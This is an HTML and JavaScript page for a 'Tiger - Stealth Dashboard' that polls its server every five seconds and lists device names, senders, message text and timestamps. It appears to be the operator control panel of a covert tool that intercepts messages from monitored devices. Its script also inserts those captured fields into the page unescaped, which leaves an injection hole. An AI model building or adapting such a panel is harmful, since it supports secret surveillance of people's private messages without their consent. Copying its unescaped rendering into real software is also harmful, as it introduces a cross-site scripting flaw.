<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Tiger - Stealth Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
        h2 { color: #ff4d4d; border-bottom: 2px solid #333; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #262626; border-radius: 8px; overflow: hidden; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #333; color: #ff4d4d; }
        tr:hover { background: #3d3d3d; }
        .badge { background: #ff4d4d; padding: 2px 8px; border-radius: 4px; font-size: 12px; }
    </style>
</head>
<body>
    <h2>üêØ Tiger Control Panel</h2>
    <table>
        <thead>
            <tr>
                <th>Device</th>
                <th>Sender</th>
                <th>Message</th>
                <th>Time</th>
            </tr>
        </thead>
        <tbody id="logTable">
            </tbody>
    </table>

    <script>
        async function fetchLogs() {
            const response = await fetch('/get-logs');
            const logs = await response.json();
            const tableBody = document.getElementById('logTable');
            tableBody.innerHTML = logs.map(log => `
                <tr>
                    <td><span class="badge">${log.device}</span></td>
                    <td><b>${log.sender}</b></td>
                    <td>${log.message}</td>
                    <td>${new Date(log.timestamp).toLocaleString()}</td>
                </tr>
            `).join('');
        }
        setInterval(fetchLogs, 5000); // Har 5 second mein update karega
        fetchLogs();
    </script>
</body>
</html>
